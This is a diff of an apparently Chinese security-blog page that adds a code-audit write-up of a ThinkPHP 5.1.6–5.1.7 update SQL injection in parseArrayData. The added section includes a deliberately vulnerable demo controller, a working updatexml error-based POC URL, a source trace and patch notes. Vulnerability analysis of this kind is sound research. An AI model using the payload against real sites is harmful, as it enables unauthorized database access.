@@ -43,8 +43,19 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192852.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192749.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192803.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203133.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203118.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203111.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202218.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202201.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202036.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202026.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202011.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201959.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201929.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201900.png">
 <meta property="article:published_time" content="2020-09-13T05:40:27.000Z">
-<meta property="article:modified_time" content="2020-09-13T11:34:44.072Z">
+<meta property="article:modified_time" content="2020-09-14T12:36:58.596Z">
 <meta property="article:author" content="m0nk3y">
 <meta property="article:tag" content="代码审计">
 <meta name="twitter:card" content="summary">
@@ -303,7 +314,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">866</span>Reading time: <span class="post-count reading-time">3 min</span></span>
+                        <span>Word count: <span class="post-count word-count">1.7k</span>Reading time: <span class="post-count reading-time">7 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -510,6 +521,73 @@ height:50vh;
 <p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192852.png" alt="image-20200913182241348"></p>
 <h2 id="利用总结"><a href="#利用总结" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192749.png" alt="image-20200913185834897"></p>
 <h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192803.png" alt="image-20200913151252661"></p>
+<h1 id="SQL注入二"><a href="#SQL注入二" class="headerlink" title="SQL注入二"></a>SQL注入二</h1><p>复现代码获取：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink&#x2F;think&#x3D;5.1  tpdemo3</span><br></pre></td></tr></table></figure>
+
+<p>将 <strong>composer.json</strong> 文件的 <strong>require</strong> 字段设置成如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;&#x3D;5.6.0&quot;,</span><br><span class="line">    &quot;topthink&#x2F;framework&quot;: &quot;5.1.7&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>../config/app.php</code> 中，需要修改<code>app_trace</code> 为true， <code>app_debug</code> 默认开启了。</p>
+<p>创建数据库：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create database tpdemo;</span><br><span class="line">use tpdemo;</span><br><span class="line">create table users(</span><br><span class="line">	id int primary key auto_increment,</span><br><span class="line">	username varchar(50) not null</span><br><span class="line">);</span><br><span class="line">insert into users(id,username) values(1,&#39;testuser&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>这里也要设置username 字段 为<code>NULL</code> 才行</p>
+<p>修改<code>/application/index/controller/index.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        db(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&#x27;id&#x27;</span> =&gt; <span class="number">1</span>])-&gt;update([<span class="string">&#x27;username&#x27;</span> =&gt; $username]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index&#x2F;index?username[0]&#x3D;point&amp;username[1]&#x3D;1&amp;username[2]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]&#x3D;0</span><br></pre></td></tr></table></figure>
+
+<p>很SQL 注入一非常类似。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203133.png" alt="image-20200914152750668"></p>
+<h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><p>漏洞影响版本： <strong>5.1.6&lt;=ThinkPHP&lt;=5.1.7</strong> (非最新的 <strong>5.1.8</strong> 版本也可利用)。</p>
+<h2 id="漏洞概述-1"><a href="#漏洞概述-1" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>本次漏洞存在于 <strong>Mysql</strong> 类的 <strong>parseArrayData</strong> 方法中由于程序没有对数据进行很好的过滤，将数据拼接进 <strong>SQL</strong> 语句，导致 <strong>SQL注入漏洞</strong> 的产生</p>
+<p>注入类型：<code>update</code> 注入</p>
+<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><blockquote>
+<p>对于开源项目，在issue 或者 commit \ Releases 记录中，就能找到历史漏洞信息。这一点在CTF中经常用到，尤其是Node.js 的第三方依赖漏洞。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203118.png" alt="image-20200914161022479"></p>
+<ul>
+<li>下断点，debug。观察参数传递过程</li>
+<li>监控MySQL</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203111.png" alt="image-20200914184917592"></p>
+<hr>
+<p>下断点，开启Debug，打Payload。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202218.png" alt="image-20200914173011583"></p>
+<p><code>../thinkphp/library/think/db/Query.php</code> 中，Payload 传入Query 类的 <code>update</code>方法，跟进该方法，该方法调用了<code>Connection</code> 类的该方法为<code>update</code>方法，该方法又调用了 </p>
+<p><code>$this-&gt;builder</code> 的<code>update</code> 方法，此处的<code>$this-&gt;builder</code> 为为<code>think\db\builder\Mysql</code> 类。<code>class Mysql extends Builder</code> ，该类继承于<code>Builder</code> 类。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202201.png" alt="image-20200914170732409"></p>
+<p>在<code>Builder</code>类中的<code>update</code>方法，调用了<code>parseData</code>方法，（正如上图debug结果。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202036.png" alt="image-20200914184754350"></p>
+<p>在该方法中的<code>swich</code>语句中，之前出现过漏洞，现在多了一条default 语句。而在新版本中被删除了。</p>
+<p>跟进到<code>parseData</code> 方法，发现Payload 又被<code>parseArrayData</code>方法处理，继续跟进，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202026.png" alt="image-20200914185836504"></p>
+<p>在<code>../thinkphp/library/think/db/builder/Mysql.php</code> 中的 200 行返回result 的地方打断点，调试结果如下。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202011.png"></p>
+<p>此处将可控变量经过拼接后被带入数据库进行查询。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201959.png" alt="image-20200914193548748"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseArrayData</span>(<span class="params">Query $query, $data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">list</span>($type, $value) = $data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (strtolower($type)) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;point&#x27;</span>:</span><br><span class="line">            $fun   = <span class="keyword">isset</span>($data[<span class="number">2</span>]) ? $data[<span class="number">2</span>] : <span class="string">&#x27;GeomFromText&#x27;</span>;</span><br><span class="line">            $point = <span class="keyword">isset</span>($data[<span class="number">3</span>]) ? $data[<span class="number">3</span>] : <span class="string">&#x27;POINT&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">                $value = implode(<span class="string">&#x27; &#x27;</span>, $value);</span><br><span class="line">            &#125;</span><br><span class="line">            $result = $fun . <span class="string">&#x27;(\&#x27;&#x27;</span> . $point . <span class="string">&#x27;(&#x27;</span> . $value . <span class="string">&#x27;)\&#x27;)&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $result = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result = $fun . <span class="string">&#x27;(\&#x27;&#x27;</span> . $point . <span class="string">&#x27;(&#x27;</span> . $value . <span class="string">&#x27;)\&#x27;)&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>三个变量均可控。形式为：<code>$a(&#39;$b($c)&#39;)</code> </p>
+<blockquote>
+<p>现在就是想办法如何闭合，然后进行注入攻击。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE &#96;users&#96;  SET &#96;username&#96; &#x3D; $a(&#39;$b($c)&#39;)  WHERE  &#96;id&#96; &#x3D; 1;</span><br></pre></td></tr></table></figure>
+
+<p>即让<code>$fun</code> 为我们的恶意Payload 即可。然后闭合掉后面的部分。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7,user(),0x7e),1)^(&#39;0(1)&#39;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用总结-1"><a href="#利用总结-1" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201929.png" alt="carbon"></p>
+<p>下图来自参考资料。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201900.png" alt="8"></p>
+<h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>升级最新版，</p>
+<p>官方直接删了<code>parseArrayDate</code> 函数。</p>
+<blockquote>
+<p>一点点感想，我感觉按照这个师傅的分析思路，是逆着payload 去分析的漏洞原因，我好想正面直接挖啊，菜死了。</p>
+</blockquote>
 
     </article>
     <!-- license  -->
@@ -518,7 +596,7 @@ height:50vh;
             <p>Author：<a href="https://hack-for.fun">m0nk3y</a>
             <p>原文链接：<a href="https://hack-for.fun/69fea760.html">https://hack-for.fun/69fea760.html</a>
             <p>发表日期：<a href="https://hack-for.fun/69fea760.html">September 13th 2020, 1:40:27 pm</a>
-            <p>更新日期：<a href="https://hack-for.fun/69fea760.html">September 13th 2020, 7:34:44 pm</a>
+            <p>更新日期：<a href="https://hack-for.fun/69fea760.html">September 14th 2020, 8:36:58 pm</a>
             <p>版权声明：<b>原创文章转载时请注明出处</b></p>
         </div>
     
@@ -647,7 +725,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E4%B8%80"><span class="toc-number">1.</span> <span class="toc-text">SQL注入一</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">1.1.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">1.2.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text">利用总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.6.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E4%B8%80"><span class="toc-number">1.</span> <span class="toc-text">SQL注入一</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">1.1.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">1.2.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text">利用总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.6.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E4%BA%8C"><span class="toc-number">2.</span> <span class="toc-text">SQL注入二</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#POC-1"><span class="toc-number">2.1.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-1"><span class="toc-number">2.2.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0-1"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-number">2.4.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93-1"><span class="toc-number">2.5.</span> <span class="toc-text">利用总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="toc-number">2.6.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -979,17 +1057,17 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="协议层安全"><span class="iconfont-archer">&#xe606;</span>协议层安全</span>
     
-        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
-    
         <span class="sidebar-tag-name" data-tags="PHP安全"><span class="iconfont-archer">&#xe606;</span>PHP安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
     
         <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
         <span class="sidebar-tag-name" data-tags="Linux应急响应"><span class="iconfont-archer">&#xe606;</span>Linux应急响应</span>
     
-        <span class="sidebar-tag-name" data-tags="漏洞挖掘"><span class="iconfont-archer">&#xe606;</span>漏洞挖掘</span>
-    
         <span class="sidebar-tag-name" data-tags="端口"><span class="iconfont-archer">&#xe606;</span>端口</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞挖掘"><span class="iconfont-archer">&#xe606;</span>漏洞挖掘</span>
     
         <span class="sidebar-tag-name" data-tags="iptables"><span class="iconfont-archer">&#xe606;</span>iptables</span>
     
